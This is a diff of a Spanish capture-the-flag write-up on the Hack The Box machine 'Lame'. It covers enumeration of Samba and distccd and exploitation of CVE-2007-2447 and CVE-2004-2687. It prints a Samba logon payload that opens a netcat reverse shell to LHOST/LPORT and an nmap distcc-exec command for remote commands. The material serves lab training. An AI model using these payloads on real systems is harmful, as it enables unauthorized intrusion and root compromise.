@@ -7,7 +7,7 @@ date: 2020-07-17 22:59:00 Z
 
 El primer paso, será comprobar si disponemos de conectividad entre nuestra máquina y la máquina objetivo.
 Podemos realizar un ping a la dirección de distino.
-![ping.jpg](%7B%7Bsite.baseurl%7D%7D/images/Lame/ping.jpg)
+![ping.jpg]({{site.baseurl}}/images/Lame/ping.jpg)
 Podemos comprobar como los paquetes llegan a la máquina de destino correctamente, además a través del comando ping, conocemos que se trata de una máquina Linux.
 
 # RECONOCIMIENTO
@@ -60,7 +60,7 @@ Host script results:
 Vamos a obtener más información de los servicios samba.
 NMAP cuenta con scripts, para realizar una enumeración de samba.
 ```
-kali@kali:\~/HTB/lame/paper$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.10.3 -Pn
+nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.10.3 -Pn
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-17 15:15 EDT
 Nmap scan report for 10.10.10.3
 Host is up (0.10s latency).
@@ -110,19 +110,51 @@ Host script results:
 ```
 Podemos intentar acceder con smbclient, a algunos de los directorios listamos con los scripts de Nmap.
 Pero no vemos nada relevante.
-Por último nos queda el puerto distccd v1, volvemos a usar la herramienta nmap, y sus buenos scripts.
+Averiguado la versión de Samba 3.0.20, haremos uso de searchsploit para comprobar si está versión es vulnerable.
+![searchsploit.jpg]({{site.baseurl}}/images/Lame/searchsploit.jpg)
+
+Por último nos queda el puerto **distccd v1**, volvemos a usar la herramienta nmap, y sus buenos scripts.
 
 ![Nmap=distcc.jpg]({{site.baseurl}}/images/Lame/Nmap=distcc.jpg)
 
 # Análisis
 
-Descubrimos la vulnerabilidad **CVE-2004-2687**,está vulnerabilidad tiene una gravedad de rango **ALTO**, y nos permitiría ejecutar comandos de manera remota.
+Descubrimos un primer vector en Samba 3.0.20, la vulnerabilidad CVE2007-2447 
+En la cuál podremos ejecutar una reverse shell hacía nuestro equipo.
+
+Descubrimos un segundo vector, la vulnerabilidad **CVE-2004-2687**,está vulnerabilidad tiene una gravedad de rango **ALTO**, y nos permitiría ejecutar comandos de manera remota.
+
 Podemos hacer uso de este código
 `nmap -p 3632 <ip> --script distcc-exec --script-args="distcc-exec.cmd='id'"`
 O podemos hacer uso de este [script](https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855), es nuestro caso, será el que usemos.
 
 # Explotación
 
+Atacando al primer vector.
+Primero, levantamos un puerto con netcat 
+
+![ncsamba.jpg]({{site.baseurl}}/images/Lame/ncsamba.jpg)
+
+Y por otra parte accedemos a los recursos de smb con smbclient
+
+![smbclientsamba.jpg]({{site.baseurl}}/images/Lame/smbclientsamba.jpg)
+
+Introducimos el siguiente comando
+**logon “./=`nohup nc -e /bin/sh LHOST LPORT`”**
+Una vez introducido el comando
+
+![smbclient2.jpg]({{site.baseurl}}/images/Lame/smbclient2.jpg)
+
+Se produce la conexión
+
+![ncsamba2.jpg]({{site.baseurl}}/images/Lame/ncsamba2.jpg)
+
+Conseguimos rápidamente root sin necesidad de una post-explotación
+
+
+
+
+Atacando al segundo vector
 Si leemos el script, nos indica como explotarlo.
 Primero, levantamos un puerto con netcat
 
